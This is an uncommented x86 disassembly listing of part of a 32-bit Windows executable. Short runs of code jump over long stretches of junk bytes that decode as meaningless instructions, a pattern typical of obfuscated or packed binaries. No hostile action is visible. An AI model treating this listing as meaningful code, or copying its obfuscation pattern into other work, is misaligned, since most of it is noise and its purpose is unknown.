  403016:	push   0x8b9c
  40301b:	call   DWORD PTR ds:0x438800
  403021:	mov    DWORD PTR [ebp-0x50],0x9e79e889
  403028:	push   0x3
  40302a:	pop    eax
  40302b:	jmp    0x403103
  403030:	push   0xca1e48e2
  403035:	mov    esi,0xf341f67e
  40303a:	push   ebp
  40303b:	in     al,0x8d
  40303d:	xchg   ebx,eax
  40303e:	pop    edi
  40303f:	imul   ebp,DWORD PTR [ebx+0xc],0xbb0000
  403046:	add    BYTE PTR [eax],al
  403048:	inc    ecx
  403049:	inc    ebp
  40304a:	addr16 inc edx
  40304c:	xchg   edx,eax
  40304d:	jmp    0xa9a6d435
  403052:	out    dx,eax
  403053:	stc    
  403054:	xchg   edi,eax
  403055:	leave  
  403056:	pusha  
  403057:	add    BYTE PTR [ebp-0x73],ch
  40305a:	inc    eax
  40305b:	push   ecx
  40305c:	push   edx
  40305d:	and    eax,0x6ec1a2be
  403062:	fdivr  QWORD PTR [edx+0x2d]
  403065:	inc    esi
  403066:	sbb    BYTE PTR [ebp-0x570d2fdd],cl
  40306c:	ins    BYTE PTR es:[edi],dx
  40306d:	mov    ebp,0xc22b2df8
  403072:	pushf  
  403073:	pop    edi
  403074:	push   cs
  403075:	fstenv [edi+0x2ee3b1dd]
  40307c:	push   0x49
  40307e:	lahf   
  40307f:	add    ebx,DWORD PTR [edx-0x76b7cd4f]
  403085:	inc    esp
  403086:	push   edx
  403087:	imul   esp,DWORD PTR [edx-0x2c4ab6c1],0x547cb192
  403091:	add    dl,BYTE PTR [ecx-0x27f696f1]
  403097:	mov    eax,ds:0xd7de01a
  40309c:	outs   dx,BYTE PTR ds:[esi]
  40309d:	scas   al,BYTE PTR es:[edi]
  40309e:	dec    esi
  40309f:	push   esp
  4030a0:	xchg   eax,esi
  4030a2:	jmp    0x19c71faf
  4030a7:	or     BYTE PTR [edx-0x38d6e676],0xb2
  4030ae:	addr16 in eax,dx
  4030b0:	mov    ebx,0x4c0675e2
  4030b5:	fs arpl bx,ax
  4030b8:	adc    DWORD PTR ss:[esi-0x15b5e9bc],edi
  4030bf:	scas   al,BYTE PTR es:[edi]
  4030c0:	xor    BYTE PTR [ebx],bh
  4030c2:	sub    al,0xda
  4030c4:	sbb    BYTE PTR [ebx-0x21916474],dl
  4030ca:	das    
  4030cb:	and    bh,BYTE PTR [ebx+0x94aa636]
  4030d1:	aam    0x59
  4030d3:	dec    eax
  4030d4:	xchg   ebx,eax
  4030d5:	pop    ecx
  4030d6:	retf   0x371c
  4030d9:	jmp    0x41b2:0x9c2f5503
  4030e0:	jmp    0x1a2:0xceb04abd
  4030e7:	add    DWORD PTR [ebx-0x4f],eax
  4030ea:	sbb    al,0x51
  4030ec:	fcomp  DWORD PTR [edi+0x202f326f]
  4030f2:	or     ebp,DWORD PTR [edx]
  4030f4:	or     edx,DWORD PTR [ecx-0x73487de9]
  4030fa:	xchg   ebp,eax
  4030fb:	(bad)  [eax-0x64b78475]
  403101:	cmc    
  403102:	sub    BYTE PTR [ecx+0x45c7b445],cl
  403108:	fcom   QWORD PTR [esi+0x13000067]
  40310e:	or     eax,0x42f5f4
  403113:	mov    DWORD PTR [ebp-0x1c],0x585d
  40311a:	cmp    DWORD PTR ds:0x42f634,0x0
  403121:	ja     0x403148
  403127:	mov    ecx,DWORD PTR ds:0x42f61c
  40312d:	xor    DWORD PTR ds:0x42f5bc,ecx
  403133:	jmp    0x403148
  403138:	push   0x42f5b0
  40313d:	push   0x3b68
  403142:	call   DWORD PTR ds:0x4387e4
  403148:	mov    DWORD PTR [ebp-0x14],0x1c4d
  40314f:	jmp    0x403227
  403154:	jp     0x4030f1
  403156:	cmp    esp,eax
  403158:	stc    
  403159:	out    0xff,al
  40315b:	mov    edi,0xcde7a445
  403160:	xor    BYTE PTR [ebp-0x40],al
  403163:	xchg   ebp,eax
  403164:	es or  eax,0xbb0000
  40316a:	add    BYTE PTR [eax],al
  40316c:	idiv   BYTE PTR [esi]
  40316e:	jnp    0x403150
  403170:	aad    0x9a
  403172:	imul   eax,DWORD PTR [ebp+0x50],0x56
  403176:	jbe    0x40313d
  403178:	adc    bh,al
  40317a:	xor    bh,ch
  40317c:	push   ebp
  40317d:	sub    ecx,DWORD PTR [esi+0x56]
  403180:	fmul   DWORD PTR [ebx+0x51c7cd1f]
  403186:	pop    ebp
  403187:	adc    eax,0x41df52d1
  40318c:	xor    dh,BYTE PTR [esi]
  40318e:	shl    BYTE PTR [ebx-0x3],0xf3
  403192:	sbb    eax,0xbb8a4c1a
  403197:	mov    bl,0xea
  403199:	ss push ecx
  40319b:	int3   
  40319c:	bswap  ecx
  40319e:	or     DWORD PTR [esi+ebp*8],ecx
  4031a1:	mov    DWORD PTR [edi],esp
  4031a3:	jbe    0x403162
  4031a5:	(bad)  
  4031a6:	in     eax,0xbd
  4031a8:	nop
  4031a9:	(bad)  
  4031ab:	jns    0x4031ef
  4031ad:	xchg   ebp,eax
  4031ae:	or     ah,BYTE PTR [edi+0x4e]
  4031b1:	mov    edx,0x95ea8b95
  4031b6:	iret   
  4031b7:	mov    ds:0x9ed2abcb,eax
  4031bc:	retf   0x2276
  4031bf:	jp     0x4031e2
  4031c1:	cmp    DWORD PTR [ecx+0x79ebb8dc],ebx
  4031c7:	cmp    al,0xbb
  4031c9:	sti    
  4031ca:	jp     0x4031a4
  4031cc:	xchg   dl,ah
  4031ce:	xchg   ebx,eax
  4031cf:	pop    eax
  4031d0:	leave  
  4031d1:	push   esi
  4031d2:	call   0x19524c5f
  4031d7:	dec    esp
  4031d8:	rcl    BYTE PTR [ecx],cl
  4031da:	shr    DWORD PTR [eax-0x54f98a48],0xb3
  4031e1:	sbb    ch,BYTE PTR [ebp-0x608e01f4]
  4031e7:	jp     0x4031a3
  4031e9:	rcr    DWORD PTR [ebp+0x64a7a3d8],0xf8
  4031f0:	fistp  DWORD PTR [ebx-0x18ddcd17]
  4031f6:	sub    al,0xb5
  4031f8:	clc    
  4031f9:	pop    edi
  4031fa:	inc    ebp
  4031fb:	mov    ebp,0x355aee18
  403200:	gs inc edi
  403202:	mov    ebp,ebp
  403204:	aas    
  403205:	cmp    edx,DWORD PTR fs:[edx+0x9a44dac]
  40320c:	jmp    0x5c8b269d
  403211:	lahf   
  403212:	pop    edi
  403213:	sbb    BYTE PTR [edi],0x5a
  403216:	(bad)  
  403217:	aas    
  403218:	sub    DWORD PTR [ebx+0x2469bd63],edi
  40321e:	or     BYTE PTR ds:0x7fa47db,dl
  403224:	outs   dx,DWORD PTR ds:[esi]
  403225:	push   cs
  403226:	faddp  st(7),st
  403228:	inc    ebp
  403229:	int3   
  40322a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40322b:	add    eax,DWORD PTR [eax]
  40322d:	add    bh,al
  40322f:	inc    ebp
  403230:	int3   
  403231:	jle    0x4032aa
  403233:	add    BYTE PTR [eax],al
  403235:	jmp    0x40330d
  40323a:	pushf  
  40323b:	push   0xffffffcd
  40323d:	adc    eax,0xebdcb7ff
  403242:	xchg   esi,eax
  403243:	mov    ch,BYTE PTR [edx-0x6b]
  403246:	lock push edx
  403248:	push   ds
  403249:	gs loope 0x403259
  40324c:	add    BYTE PTR [eax],al
  40324e:	mov    ebx,0x56000000
  403253:	fnstcw WORD PTR [ebp+0x36]
  403256:	jnp    0x40322b
  403258:	and    edi,DWORD PTR [ebx-0xb98887e]
  40325e:	loope  0x40321b
  403260:	xchg   edx,eax
  403261:	dec    esp
  403262:	rcl    esi,0x39
  403265:	and    BYTE PTR [edx+esi*4-0x63],dl
  403269:	or     DWORD PTR [eax+0x50bdec62],ebp
  40326f:	icebp  
  403270:	out    0x48,eax
  403272:	cld    
  403273:	push   edi
  403274:	rcr    DWORD PTR [edx],cl
  403276:	add    esp,ebp
  403278:	inc    edi
  403279:	and    edx,DWORD PTR [esi]
  40327b:	mov    esi,0x1714f82
  403280:	cmp    al,0xb6
  403282:	sbb    BYTE PTR [eax],dh
  403284:	jmp    0x9563d7e0
  403289:	lock jp 0x403276
  40328c:	xchg   edi,eax
  40328d:	inc    edi
  40328e:	fwait
  40328f:	mov    eax,ds:0x4494dd0e
  403294:	call   FWORD PTR [ecx-0x39]
  403297:	pop    esp
  403298:	xchg   dh,dh
  40329a:	or     eax,0xd1ad5d90
  40329f:	ins    DWORD PTR es:[edi],dx
  4032a0:	xchg   ecx,eax
  4032a1:	out    0x9a,al
  4032a3:	pop    ss
  4032a4:	bound  esi,QWORD PTR [edx-0x287d5a3f]
  4032aa:	mov    bl,0x5f
  4032ac:	ret    
  4032ad:	xchg   ebp,edi
  4032af:	pop    ecx
  4032b0:	cmp    DWORD PTR [edi-0xc],ecx
  4032b3:	inc    ebp
  4032b4:	push   ss
  4032b5:	scas   al,BYTE PTR es:[edi]
  4032b6:	adc    al,0x7
  4032b8:	mov    DWORD PTR [ecx+0x32],ebx
  4032bb:	(bad)  
  4032bc:	xchg   esp,eax
  4032bd:	(bad)  [ebx+0x55c4d327]
  4032c3:	ins    DWORD PTR es:[edi],dx
  4032c4:	outs   dx,DWORD PTR ds:[esi]
  4032c5:	retf   0x417a
  4032c8:	jb     0x403256
  4032ca:	sub    esi,eax
  4032cc:	mov    ebp,DWORD PTR [ebx]
  4032ce:	cmp    al,0x4d
  4032d0:	cmp    edi,DWORD PTR [eax]
  4032d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032d3:	push   ecx
  4032d4:	cmp    ebp,eax
  4032d6:	out    0x65,eax
  4032d8:	fwait
  4032d9:	adc    cl,BYTE PTR [ecx]
  4032db:	daa    
  4032dc:	stos   DWORD PTR es:[edi],eax
  4032dd:	xor    eax,0xfaf01f2d
  4032e2:	repz loope 0x4032e0
  4032e5:	inc    edi
  4032e6:	or     al,0xaf
  4032e8:	test   eax,0x8ec312b4
  4032ed:	test   al,0x8c
  4032ef:	inc    ecx
  4032f0:	xchg   dl,cl
  4032f2:	dec    ebp
  4032f3:	std    
  4032f4:	shl    eax,0xbd
  4032f7:	cmp    al,0x31
  4032f9:	push   ebx
  4032fa:	pop    ebx
  4032fb:	mov    esp,0x5f56dc82
  403300:	inc    edi
  403301:	cmc    
  403302:	xor    al,0x12
  403304:	cli    
  403305:	jbe    0xff0626ca
  40330b:	adc    al,0xdd
  40330d:	mov    DWORD PTR [ebp-0x34],eax
  403310:	mov    eax,DWORD PTR [ebp-0x50]
  403313:	xor    ecx,DWORD PTR ds:0x42f5cc
  403319:	mov    ecx,DWORD PTR [ebp-0x4c]
  40331c:	or     DWORD PTR ds:0x42f554,0x880
  403326:	push   ecx
  403327:	xor    DWORD PTR ds:0x42f5e4,0x6068
  403331:	push   eax
  403332:	and    DWORD PTR ds:0x42f530,0x2e33
  40333c:	jmp    0x403414
  403341:	xchg   ah,cl
  403343:	xchg   edi,eax
  403344:	mov    ds:0xedb6fbdf,eax
  403349:	pop    esi
  40334a:	cmp    dh,BYTE PTR [ebp-0x61]
  40334d:	pop    ebx
  40334e:	push   ss
  40334f:	clc    
  403350:	or     eax,0xe9c
  403355:	mov    ebx,0x2e000000
  40335a:	xchg   ebp,eax
  40335b:	in     al,dx
  40335c:	cmp    cl,bh
  40335e:	test   eax,0xe3cffe03
  403363:	repz sub eax,0x624c5252
  403369:	add    DWORD PTR [edi-0x355a277c],eax
  40336f:	call   FWORD PTR [edi]
  403371:	dec    edx
  403372:	mov    DWORD PTR [edi-0x6aff353],ecx
  403378:	popa   
  403379:	mov    bh,0x7c
  40337b:	(bad)  
  40337c:	jae    0x403377
  40337e:	pop    es
  40337f:	dec    edx
  403380:	lahf   
  403381:	xor    esi,ecx
  403383:	lds    eax,FWORD PTR [ebx-0x7072aad6]
  403389:	lahf   
  40338a:	xchg   edi,eax
  40338b:	push   ebx
  40338c:	aad    0x4d
  40338e:	iret   
  40338f:	ror    DWORD PTR [ecx],0x40
  403392:	jmp    0xb3be:0x35392e19
  403399:	mov    ah,0x9b
  40339b:	fs add al,0x1f
  40339e:	hlt    
  40339f:	test   DWORD PTR [ebx-0x49],ebx
  4033a2:	push   0xfffffffa
  4033a4:	lea    esp,[ecx]
  4033a6:	push   ds
  4033a7:	jo     0x403407
  4033a9:	xchg   ebp,eax
  4033aa:	jnp    0x403357
  4033ac:	pop    eax
  4033ad:	cmp    al,0x8c
  4033af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033b0:	lea    edx,[ebp+edi*2+0xe053649]
  4033b7:	push   edx
  4033b8:	push   eax
  4033b9:	popf   
  4033ba:	idiv   DWORD PTR [eax+0x2]
  4033bd:	ret    
  4033be:	aad    0xf5
  4033c0:	retf   0x5869
  4033c3:	and    al,0x61
  4033c5:	jp     0x40338f
  4033c7:	mov    ds:0x7caefe91,eax
  4033cc:	hlt    
  4033cd:	dec    ebx
  4033ce:	jecxz  0x4033d0
  4033d0:	pop    eax
  4033d1:	sub    eax,0xcb2b314f
  4033d6:	(bad)  
  4033d8:	in     eax,0xe9
  4033da:	loop   0x403385
  4033dc:	loope  0x4033e1
  4033de:	(bad)  
  4033df:	mov    ebx,0x5138455a
  4033e4:	scas   al,BYTE PTR es:[edi]
  4033e5:	xor    BYTE PTR [ebx+0x29],0x9
  4033e9:	mov    cl,0x1e
  4033eb:	xor    ebx,ecx
  4033ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033ee:	stc    
  4033ef:	out    0xe8,al
  4033f1:	push   ecx
  4033f2:	(bad)  
  4033f4:	addr16 out 0x90,al
  4033f7:	sub    ah,ch
  4033f9:	cs jl  0x4033d2
  4033fc:	dec    eax
  4033fd:	scas   eax,DWORD PTR es:[edi]
  4033fe:	imul   ebp,DWORD PTR [eax+0x12],0x56
  403402:	or     BYTE PTR [esi+0x1c7c01e9],0x34
  403409:	or     dl,cl
  40340b:	add    eax,0xca784b35
  403410:	cmp    ebp,DWORD PTR [edx-0x69]
  403413:	cmp    BYTE PTR [eax-0x38],ch
  403416:	add    DWORD PTR [eax],eax
  403418:	add    BYTE PTR [eax-0x2d],ch
  40341b:	jae    0x40341d
  40341d:	add    al,ch
  40341f:	mov    cl,BYTE PTR [ecx]
  403421:	add    al,BYTE PTR [eax]
  403423:	mov    ecx,DWORD PTR [ebp-0x58]
  403426:	and    DWORD PTR ds:0x42f550,0x4ec6
  403430:	mov    edx,DWORD PTR [ebp-0x54]
  403433:	and    eax,ecx
  403435:	mov    ecx,DWORD PTR [ebp-0x60]
  403438:	not    edx
  40343a:	mov    edx,DWORD PTR [ebp-0x5c]
  40343d:	and    edx,DWORD PTR ds:0x42f658
  403443:	xor    eax,0x37ed
  403448:	sub    eax,ecx
  40344a:	cmp    DWORD PTR ds:0x42f5b4,0x0
  403451:	jb     0x403473
  403457:	mov    edx,DWORD PTR ds:0x42f640
  40345d:	sbb    DWORD PTR ds:0x42f634,edx
  403463:	jmp    0x403473
  403468:	push   0x1a8f
  40346d:	call   DWORD PTR ds:0x4387ac
  403473:	mov    ecx,DWORD PTR ds:0x42f1d4
  403479:	lea    eax,[eax+ecx*1+0xb52]
  403480:	mov    ecx,DWORD PTR [ebp-0x14]
  403483:	mov    edx,DWORD PTR [ebp-0x1c]
  403486:	jmp    0x40355e
  40348b:	or     dl,BYTE PTR [edi+0x4]
  40348e:	pop    edi
  40348f:	pop    ebp
  403490:	pop    edi
  403491:	pop    ebx
  403492:	push   edi
  403493:	ds and al,0x6b
  403496:	or     eax,0x698e384e
  40349b:	push   edi
  40349c:	sldt   WORD PTR [eax]
  40349f:	mov    ebx,0x93000000
  4034a4:	pusha  
  4034a5:	push   0xfffffffc
  4034a7:	adc    DWORD PTR [eax-0x14],eax
  4034aa:	xor    bl,BYTE PTR ds:0x6280f4c1
  4034b0:	aaa    
  4034b1:	hlt    
  4034b2:	popf   
  4034b3:	dec    eax
  4034b4:	jmp    0x4034af
  4034b6:	inc    edx
  4034b7:	rol    ebp,cl
  4034b9:	bts    esp,eax
  4034bc:	mov    dh,0x3e
  4034be:	dec    esp
  4034bf:	add    dh,dh
  4034c1:	outs   dx,DWORD PTR ds:[esi]
  4034c2:	adc    DWORD PTR [esi+0x449f2e18],ebx
  4034c8:	xor    ch,BYTE PTR [edx+0x60]
  4034cb:	stc    
  4034cc:	pop    ds
  4034cd:	das    
  4034ce:	sub    eax,0x74397c1e
  4034d3:	pop    esp
  4034d4:	call   0xafe3:0xf80cf97
  4034db:	popf   
  4034dc:	in     eax,0x76
  4034de:	mov    ds:0x40573682,al
  4034e3:	cmp    DWORD PTR [ebx+0x331df37f],0x77
  4034ea:	sbb    BYTE PTR [ebx+0x300591d0],0x1
  4034f1:	daa    
  4034f2:	mov    DWORD PTR [eax],edi
  4034f4:	adc    al,0xf1
  4034f6:	or     cl,al
  4034f8:	(bad)  
  4034f9:	or     dl,BYTE PTR [ecx-0x71]
  4034fc:	fsubr  DWORD PTR [ecx+0x5e102e6f]
  403502:	xor    DWORD PTR [ebp+ecx*1+0x11c56dff],esp
  403509:	mov    ch,0x10
  40350b:	leave  
  40350c:	ret    
  40350d:	jo     0x403559
  40350f:	dec    eax
  403510:	mov    DWORD PTR ds:0x454e05f7,edx
  403516:	adc    DWORD PTR [ebp+0x2236f909],esp
  40351c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351d:	mov    ecx,DWORD PTR [edi-0x18cf9d4a]
  403523:	mov    ebp,ebx
  403525:	mov    esi,0x211ea70c
  40352a:	call   0xbbab:0xbe560d5d
  403531:	ror    BYTE PTR [esi],0xea
  403534:	test   BYTE PTR [eax+0x4672300d],bl
  40353a:	repnz add esi,DWORD PTR [ecx]
  40353d:	repnz or eax,DWORD PTR [eax]
  403540:	push   eax
  403541:	xchg   ebp,eax
  403542:	mov    ds:0x383cbde1,al
  403547:	addr16 inc esp
  403549:	fnstsw WORD PTR [esi+0x2d]
  40354c:	push   ss
  40354d:	pop    ecx
  40354e:	mov    al,0x13
  403550:	or     bl,BYTE PTR [edi]
  403552:	sti    
  403553:	push   esi
  403554:	add    al,0xc5
  403556:	xor    ah,BYTE PTR [ebp+0x24]
  403559:	sbb    ch,BYTE PTR [ebx+0x2b38e701]
  40355f:	ror    DWORD PTR [ebx+0x5c7dc4d],1
  403565:	or     al,0xf6
  403567:	inc    edx
  403568:	add    BYTE PTR [ecx+0x49],bl
  40356b:	add    BYTE PTR [eax],al
  40356d:	and    edx,ecx
  40356f:	sbb    DWORD PTR ds:0x42f53c,0x42f65c
  403579:	jmp    0x403651
  40357e:	jp     0x403544
  403580:	cld    
  403581:	mov    esi,edi
  403583:	mov    ecx,0x793bf77f
  403588:	jnp    0x4035bd
  40358a:	xchg   ebx,eax
  40358b:	mov    ebp,0x1012388c
  403590:	add    BYTE PTR [eax],al
  403592:	mov    ebx,0x5a000000
  403597:	dec    ebp
  403598:	sub    BYTE PTR [esp+ebx*2+0x1812ab5],al
  40359f:	adc    edx,DWORD PTR [ebx-0x1a509cfd]
  4035a5:	(bad)  
  4035a6:	fist   DWORD PTR [eax-0x64]
  4035a9:	jge    0x40353e
  4035ab:	xor    al,0xc5
  4035ad:	cwde   
  4035ae:	in     eax,0x23
  4035b0:	pusha  
  4035b1:	jns    0x403537
  4035b3:	jnp    0x403558
  4035b5:	mov    dh,0xd9
  4035b7:	adc    esi,eax
  4035b9:	mov    edx,0xcba4daf3
  4035be:	das    
  4035bf:	std    
  4035c0:	fwait
  4035c1:	mov    ebx,0x974ac260
  4035c6:	lock sbb dl,BYTE PTR [eax+eax*1-0x4]
  4035cb:	inc    ebx
  4035cc:	xchg   BYTE PTR [ecx-0x6f],bh
  4035cf:	push   0x60
  4035d1:	popa   
  4035d2:	push   edx
  4035d3:	pop    ebx
  4035d4:	push   cs
  4035d5:	sub    DWORD PTR [eax+ebx*1+0x7145c695],edi
  4035dc:	sub    DWORD PTR [ebx+0x2e689b1],ecx
  4035e2:	or     edx,DWORD PTR [ebp-0x34]
  4035e5:	sbb    al,BYTE PTR [edi-0x42]
  4035e8:	lods   al,BYTE PTR ds:[esi]
  4035e9:	sbb    esi,0xffffff96
  4035ec:	sbb    edi,ebp
  4035ee:	loope  0x40365e
  4035f0:	lds    edi,FWORD PTR [esi]
  4035f2:	jl     0x4035ff
  4035f4:	mov    ds:0x5d7a3b0a,eax
  4035f9:	jp     0x40365f
  4035fb:	and    BYTE PTR gs:[ecx+ecx*1],dl
  4035ff:	inc    edx
  403600:	push   ebp
  403601:	sub    BYTE PTR [esi+0x723d3c1],bl
  403607:	test   BYTE PTR [ebx+ebx*8+0x2c],dh
  40360b:	enter  0xaa15,0xbe
  40360f:	pop    esi
  403610:	enter  0xbc17,0x16
  403614:	dec    ebp
  403615:	mov    bl,0xf8
  403617:	push   ss
  403618:	xor    eax,0x30098dc
  40361d:	loopne 0x4035d5
  40361f:	test   al,0x9d
  403621:	lods   al,BYTE PTR ds:[esi]
  403622:	das    
  403623:	loop   0x4035bf
  403625:	jbe    0x403665
  403627:	ss dec edi
  403629:	loopne 0x4035ea
  40362b:	je     0x403689
  40362d:	xor    ah,al
  40362f:	cmp    dh,BYTE PTR [edx]
  403631:	int    0x60
  403633:	add    esp,DWORD PTR [eax+ebx*1]
  403636:	pop    ss
  403637:	mov    edi,0xf8612f12
  40363c:	idiv   BYTE PTR [ebx+0x69e8c31a]
  403642:	jecxz  0x4035d8
  403644:	mov    ebx,0x9b2e545c
  403649:	pop    ebx
  40364a:	mov    esi,0x9624c9a6
  40364f:	popf   
  403650:	rol    BYTE PTR [ecx+0x14e7e2],1
  403656:	add    BYTE PTR [ecx+0x42f5701d],al
  40365c:	add    BYTE PTR [esi+0xf],bh
  40365f:	add    BYTE PTR [eax],al
  403661:	jmp    0x403739
  403666:	loope  0x40365f
  403668:	addr16 call 0x357e:0xfffd9a77
  403670:	cli    
  403671:	je     0x4036c6
  403673:	jecxz  0x4035f9
  403675:	fmulp  st(5),st
  403677:	adc    BYTE PTR [eax],al
  403679:	add    BYTE PTR [ebx+0x2000000],bh
  40367f:	sub    DWORD PTR [ecx+ebp*2-0x37cd4c6f],edi
  403686:	sub    edx,0xd74b0028
  40368c:	jmp    0x9b79:0x2d98daaa
  403693:	ja     0x403648
  403695:	rol    DWORD PTR [edi],1
  403697:	in     eax,dx
  403698:	(bad)
  40369b:	mov    edx,0x5e15726
  4036a0:	adc    eax,0x3b392103
  4036a5:	mov    ds:0xef058e10,eax
  4036aa:	sub    ecx,ecx
  4036ac:	jo     0x4036c3
  4036ae:	ja     0x4036a3
  4036b0:	ja     0x4036bb
  4036b2:	mov    BYTE PTR [eax+ebx*1-0x43c14a71],bl
  4036b9:	xor    DWORD PTR [eax+0x24],0x340385b8
  4036c0:	xor    al,0x79
  4036c2:	add    eax,0xfb61497a
  4036c7:	ins    BYTE PTR es:[edi],dx
  4036c8:	pop    esi
  4036c9:	adc    al,0xb2
  4036cb:	(bad)  
  4036cc:	in     eax,0xf1
  4036ce:	scas   eax,DWORD PTR es:[edi]
  4036cf:	adc    DWORD PTR ds:0xb512bc30,edx
  4036d5:	out    dx,eax
  4036d6:	adc    al,0x95
  4036d8:	push   edi
  4036d9:	loopne 0x40369a
  4036db:	out    0x7a,al
  4036dd:	cmp    al,0xf5
  4036df:	sbb    dh,dl
  4036e1:	push   eax
  4036e2:	push   edi
  4036e3:	sbb    ebp,esi
  4036e5:	jbe    0x403723
  4036e7:	loope  0x403764
  4036e9:	ins    BYTE PTR es:[edi],dx
  4036ea:	fnstcw WORD PTR [esi-0x42eb914a]
  4036f0:	pushf  
  4036f1:	fwait
  4036f2:	jae    0x4036d8
  4036f4:	adc    eax,0x7ae27e9c
  4036f9:	sub    al,0x4e
  4036fb:	jl     0x403691
  4036fd:	dec    eax
  4036fe:	(bad)  
  403700:	loopne 0x403768
  403702:	mov    eax,ds:0x9c356b0c
  403707:	sbb    DWORD PTR [ebp-0x70],eax
  40370a:	mov    edi,0xd3ddc31a
  40370f:	mov    ebp,0x4d73a79a
  403714:	in     al,0xa6
  403716:	push   esp
  403717:	dec    esi
  403718:	je     0x4036d5
  40371a:	pusha  
  40371b:	jns    0x40374d
  40371d:	pop    edx
  40371e:	outs   dx,DWORD PTR ds:[esi]
  40371f:	popa   
  403720:	imul   esi,edx,0xfac7483
  403726:	sub    BYTE PTR [ebx+0x6da5131c],cl
  40372c:	addr16 and al,bl
  40372f:	clc    
  403730:	xchg   ebp,eax
  403731:	add    bh,bl
  403733:	sbb    bl,ch
  403735:	mov    ecx,0x81cd0446
  40373a:	jmp    0x5c7:0x400
  403741:	cmp    al,0xf6
  403743:	inc    edx
  403744:	add    BYTE PTR [ebx],dl
  403746:	push   edi
  403747:	add    BYTE PTR [eax],al
  403749:	cmp    edx,DWORD PTR [eax]
  40374b:	mov    DWORD PTR ds:0x42f61c,0x40b5
  403755:	jne    0x40ab43
  40375b:	adc    eax,ecx
  40375d:	mov    eax,DWORD PTR [edi]
  40375f:	mov    ecx,DWORD PTR [edi+0x4]
  403762:	cmp    DWORD PTR ds:0x42f534,0x0
  403769:	jg     0x403785
  40376f:	add    ecx,0xe8d
  403775:	jmp    0x403785
  40377a:	push   0x1c1f
  40377f:	call   DWORD PTR ds:0x4387b0
  403785:	mov    ecx,DWORD PTR [ebp-0x8]
  403788:	xor    eax,esi
  40378a:	add    eax,0x99b8624d
  40378f:	cmp    eax,DWORD PTR [ecx]
  403791:	jmp    0x403869
  403796:	in     eax,0xf2
  403798:	cmc    
  403799:	xchg   ecx,eax
  40379a:	not    DWORD PTR [edi-0x704b091b]
  4037a0:	fbld   TBYTE PTR [ebp+0x78]
  4037a3:	mov    ds:0x11885fa0,al
  4037a8:	add    BYTE PTR [eax],al
  4037aa:	mov    ebx,0xf9000000
  4037af:	mov    dl,BYTE PTR [edi-0x70ce7111]
  4037b5:	adc    ch,dh
  4037b7:	mov    ah,0x3c
  4037b9:	xor    ecx,esp
  4037bb:	mov    WORD PTR [edx],cs
  4037bd:	fst    st(1)
  4037bf:	div    BYTE PTR [edx]
  4037c1:	ss jnp 0x4037bc
  4037c4:	xchg   ebx,eax
  4037c6:	dec    ebp
  4037c7:	shr    BYTE PTR [edx-0xc],cl
  4037ca:	jns    0x4037ed
  4037cc:	pop    edi
  4037cd:	jg     0x40383a
  4037cf:	xchg   ebp,eax
  4037d0:	icebp  
  4037d1:	stos   DWORD PTR es:[edi],eax
  4037d2:	test   al,0xb2
  4037d4:	pop    ebp
  4037d5:	add    al,0x43
  4037d7:	js     0x40380e
  4037d9:	inc    ebp
  4037da:	jmp    0x3b42:0x759c1506
  4037e1:	jo     0x403839
  4037e3:	test   dh,0x9d
  4037e6:	adc    BYTE PTR [edx],cl
  4037e8:	push   edi
  4037e9:	call   0xeb32b49
  4037ee:	jbe    0x4037b6
  4037f0:	push   ebx
  4037f1:	cdq    
  4037f2:	or     dl,BYTE PTR ds:0xe54215d7
  4037f8:	out    dx,al
  4037f9:	or     eax,0x8c00b822
  4037fe:	mov    ds:0x2de1b8b8,al
  403803:	mov    cl,0x6f
  403805:	cs retf 
  403807:	ret    0x2962
  40380a:	dec    ebp
  40380b:	mov    edi,0xda1ea6ff
  403810:	ret    
  403811:	or     eax,eax
  403813:	inc    esp
  403814:	pop    ds
  403815:	(bad)  
  403816:	mov    ebx,0x84503534
  40381b:	xor    DWORD PTR [edx],ebx
  40381d:	jmp    0x248b6550
  403822:	ficomp DWORD PTR [esi+0x5b]
  403825:	xor    BYTE PTR [ebx],ah
  403827:	xor    eax,DWORD PTR [edx-0x169c8a0b]
  40382d:	dec    esp
  40382e:	or     al,BYTE PTR [ebx]
  403830:	inc    edi
  403831:	ins    BYTE PTR es:[edi],dx
  403832:	or     bl,BYTE PTR [edx+0x5c]
  403835:	xor    edi,DWORD PTR [edi+0x192c89c5]
  40383b:	test   eax,0xeca48d42
  403840:	loop   0x4038b2
  403842:	sbb    BYTE PTR [edx-0x35],bl
  403845:	jle    0x403885
  403847:	lods   eax,DWORD PTR ds:[esi]
  403848:	pusha  
  403849:	mov    ebp,0x2f1f2770
  40384e:	sub    al,0x77
  403850:	ins    BYTE PTR es:[edi],dx
  403851:	(bad)  
  403853:	mov    dl,0x23
  403855:	leave  
  403856:	cmp    DWORD PTR [ecx-0x2cf984e3],ecx
  40385c:	sti    
  40385d:	outs   dx,BYTE PTR ds:[esi]
  40385e:	pop    ds
  40385f:	lea    edi,[esi-0x49261796]
  403865:	cmc    
  403866:	mov    ch,0x68
  403868:	adc    BYTE PTR [edi],cl
  40386a:	test   DWORD PTR [esi],edx
  40386c:	add    al,BYTE PTR [eax]
  40386e:	add    BYTE PTR [ebx-0x35ccefbb],cl
  403874:	mov    ecx,DWORD PTR [ebp+0x28]
  403877:	cmp    DWORD PTR ds:0x42f5a8,0x0
  40387e:	ja     0x403893
  403884:	dec    edx
  403885:	jmp    0x403893
  40388a:	push   DWORD PTR [ebp-0x18]
  40388d:	call   DWORD PTR ds:0x4387e8
  403893:	xor    DWORD PTR [eax],ecx
  403895:	mov    eax,DWORD PTR [ebp+0x10]
  403898:	mov    ecx,DWORD PTR [ebp+0x20]
  40389b:	mov    edx,DWORD PTR [ebp+0x24]
  40389e:	xor    ecx,esi
  4038a0:	jmp    0x403978
  4038a5:	arpl   ax,si
  4038a7:	mov    dl,0x2f
  4038a9:	mov    bl,0x6f
  4038ab:	(bad)  
  4038ac:	cld    
  4038ad:	js     0x4038f4
  4038af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038b0:	mov    eax,ds:0x4ef7a209
  4038b5:	inc    ebx
  4038b6:	adc    al,BYTE PTR [eax]
  4038b8:	add    BYTE PTR [ebx-0x45000000],bh
  4038be:	add    BYTE PTR [ebx+0x585b1c74],al
